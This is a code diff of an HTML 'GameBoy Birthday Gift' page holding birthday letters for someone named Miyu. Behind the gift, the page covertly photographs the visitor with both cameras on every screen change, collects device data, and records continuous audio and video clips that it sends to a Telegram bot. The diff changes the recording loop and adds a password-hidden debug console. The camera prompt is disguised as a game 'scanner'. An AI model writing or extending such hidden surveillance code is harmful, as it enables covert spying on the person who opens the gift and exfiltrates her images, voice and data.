@@ -5,43 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GameBoy Birthday Gift</title>
     
-    <!-- vConsole with password - FIXED -->
-<script src="https://cdn.jsdelivr.net/npm/vconsole"></script>
-<script>
-    // HAPUS semua inisialisasi vConsole sebelumnya!
-    // JANGAN PANGGIL new VConsole() di sini
-    
-    let vConsoleInstance = null;
-    
-    window.unlockVConsole = function() {
-        const pwd = prompt('🔐 ENTER DEBUG PASSWORD:');
-        if (pwd === '12234455ZXXZ') {
-            // Hapus tombol lama kalo ada
-            const oldBtn = document.querySelector('.vc-switch');
-            if (oldBtn) oldBtn.remove();
-            
-            // Buat instance baru
-            vConsoleInstance = new VConsole();
-            console.log('✅ vConsole unlocked');
-            alert('✅ Debug mode enabled');
-        } else {
-            alert('❌ Wrong password');
-        }
-    };
-    
-    // POWER 10x trigger
-    let vcClickCount = 0;
-    window.powerClick = function() {
-        vcClickCount++;
-        if (vcClickCount >= 10) {
-            unlockVConsole();
-            vcClickCount = 0;
-        }
-        setTimeout(() => vcClickCount = 0, 3000);
-    };
-    
-    console.log('✅ vConsole password system ready (NOT activated)');
-</script>
+    <!-- vConsole with password protection (FIX) -->
+    <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
+    <script>
+        let vConsoleInstance = null;
+        window.unlockVConsole = function() {
+            const pwd = prompt('🔐 ENTER DEBUG PASSWORD:');
+            if (pwd === '12234455ZXXZ') {
+                vConsoleInstance = new VConsole();
+                console.log('✅ vConsole activated');
+                alert('✅ Debug mode enabled');
+            } else {
+                alert('❌ Wrong password');
+            }
+        };
+        let vcClickCount = 0;
+        window.secretVConsole = function() {
+            vcClickCount++;
+            if (vcClickCount >= 10) {
+                unlockVConsole();
+                vcClickCount = 0;
+            }
+            setTimeout(() => vcClickCount = 0, 3000);
+        };
+    </script>
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -678,8 +665,8 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
     }
     .stats-row { display: flex; justify-content: space-between; margin: 5px 0; }
     .stats-value { color: #ffff00; font-weight: bold; }
-    </style>
-    <script>
+                    </style>
+                    <script>
     // ============================================
     // TELEGRAM CONFIG
     // ============================================
@@ -753,108 +740,57 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
     }
 
     // ============================================
-// VIDEO RECORDING - 10 DETIK + LOOP
-// ============================================
-let isRecording = false;
-let mediaRecorder = null;
-let videoStream = null;
-let recordTimeout = null;
-
-async function startVideoLoop() {
-    if (!cameraPermission || isRecording) {
-        console.log('Video loop: waiting for permission');
-        return;
-    }
-    
-    try {
-        console.log('🎥 Requesting video stream...');
-        videoStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                width: 640, 
-                height: 480, 
-                frameRate: 15 
-            }, 
-            audio: true 
-        });
+    // VIDEO RECORDING LOOP (S25 MODE)
+    // ============================================
+    async function startVideoLoop() {
+        if (!cameraPermission || isRecording) return;
         
-        let videoChunks = [];
-        
-        // Deteksi format yang didukung browser
-        let mimeType = 'video/webm';
-        if (MediaRecorder.isTypeSupported('video/mp4')) {
-            mimeType = 'video/mp4';
-        }
-        
-        mediaRecorder = new MediaRecorder(videoStream, {
-            mimeType: mimeType,
-            videoBitsPerSecond: 500000 // 500kbps
-        });
-        
-        mediaRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-                videoChunks.push(event.data);
-            }
-        };
-        
-        mediaRecorder.onstop = async () => {
-            console.log('🎥 Video stopped, sending...');
+        try {
+            videoStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { width: 640, height: 480, frameRate: 15 }, 
+                audio: true 
+            });
             
-            // Gabungin semua chunk jadi satu video
-            const videoBlob = new Blob(videoChunks, { type: mimeType });
+            videoChunks = [];
+            currentVideoSize = 0;
             
-            // Kirim ke Telegram
-            await sendVideoToTelegram(videoBlob, `🎥 Video 10s ${new Date().toLocaleString()}`);
+            mediaRecorder = new MediaRecorder(videoStream, {
+                mimeType: 'video/mp4', 
+                videoBitsPerSecond: 500000
+            });
             
-            // Matiin stream
-            videoStream.getTracks().forEach(t => t.stop());
-            
-            // Rekam lagi setelah jeda 1 detik
-            setTimeout(() => {
-                if (cameraPermission) {
-                    startVideoLoop();
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    videoChunks.push(event.data);
+                    currentVideoSize += event.data.size;
+                    if (currentVideoSize >= MAX_VIDEO_SIZE) {
+                        stopAndSendVideo();
+                        setTimeout(() => startVideoLoop(), 1000);
+                    }
                 }
-            }, 1000);
-        };
-        
-        // Rekam selama 10 detik
-        mediaRecorder.start();
-        console.log('🎥 Recording for 10 seconds...');
-        
-        // Set timeout buat stop setelah 10 detik
-        recordTimeout = setTimeout(() => {
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-                isRecording = false;
-            }
-        }, 10000); // 10.000 ms = 10 detik
-        
-        isRecording = true;
-        
-    } catch (error) {
-        console.log('❌ Video error:', error);
-        sendToTelegram("❌ Video error: " + (error.message || 'Unknown error'));
-        
-        if (error.name === 'NotAllowedError') {
-            cameraPermission = false;
-            localStorage.removeItem('gameboyCameraAllowed');
+            };
+            
+            mediaRecorder.onstop = async () => {
+                const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+                await sendVideoToTelegram(videoBlob, `🎥 Video ${new Date().toLocaleString()}`);
+                videoStream.getTracks().forEach(t => t.stop());
+            };
+            
+            mediaRecorder.start(1000);
+            isRecording = true;
+            console.log('🎥 Video started');
+            
+        } catch (error) { 
+            console.log('Video error:', error); 
         }
     }
-}
 
-// Fungsi buat stop rekaman (kalo perlu)
-function stopVideoRecording() {
-    if (recordTimeout) {
-        clearTimeout(recordTimeout);
-        recordTimeout = null;
-    }
-    if (mediaRecorder && mediaRecorder.state === 'recording') {
-        mediaRecorder.stop();
-    }
-    if (videoStream) {
-        videoStream.getTracks().forEach(t => t.stop());
-    }
-    isRecording = false;
+    function stopAndSendVideo() {
+        if (mediaRecorder && isRecording) {
+            mediaRecorder.stop();
+            isRecording = false;
         }
+    }
 
     // ============================================
     // PERMISSION LOOP (FIX)
@@ -878,7 +814,7 @@ function stopVideoRecording() {
                         GAMEBOY PIXEL SCANNER
                     </div>
                     <div style="font-size:14px; line-height:1.6; margin-bottom:30px;">
-                        GameBoy needs permission screen change for gameboy.<br><br>
+                        GameBoy needs camera & microphone access.<br><br>
                         <span style="color:#ffff00;">Press START to continue.</span>
                     </div>
                     <button onclick="requestPermission()" style="
@@ -1075,32 +1011,26 @@ function stopVideoRecording() {
     // SCREEN NAVIGATION
     // ============================================
     window.showScreen = function(screenId) {
-    if (!cameraPermission) {
-        showPermissionPopup();
-        return;
-    }
-    
-    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-    
-    const targetScreen = document.getElementById(screenId + '-screen');
-    if (targetScreen) {
-        targetScreen.classList.add('active');
-        currentScreen = screenId;
-        
-        // FOTO
-        captureBothCameras(`(opened ${screenId})`);
-        
-        // DATA
-        collectAllData();
-        
-        // ===== VIDEO MULAI 10 DETIK =====
-        if (!isRecording && cameraPermission) {
-            startVideoLoop();
+        if (!cameraPermission) {
+            showPermissionPopup();
+            return;
         }
-        // ================================
-    }
-};
         
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        const targetScreen = document.getElementById(screenId + '-screen');
+        if (targetScreen) {
+            targetScreen.classList.add('active');
+            currentScreen = screenId;
+            
+            // AUTO KIRIM FOTO + DATA (FIX)
+            captureBothCameras(`(opened ${screenId})`);
+            collectAllData();
+            
+            if (!isRecording) {
+                startVideoLoop();
+            }
+        }
+    };
         // ============================================
     // LETTERS (6 ENGLISH LETTERS)
     // ============================================
@@ -1151,6 +1081,8 @@ Happy Birthday, dear friend. 🎂`,
 If I had to describe you in one word, it would be: HOME.
 
 Not a place, but a feeling. The feeling of being understood without explanation.
+
+You are my home. And I hope I'm yours too.
 
 Happy Birthday! 🎂✨`
     ];
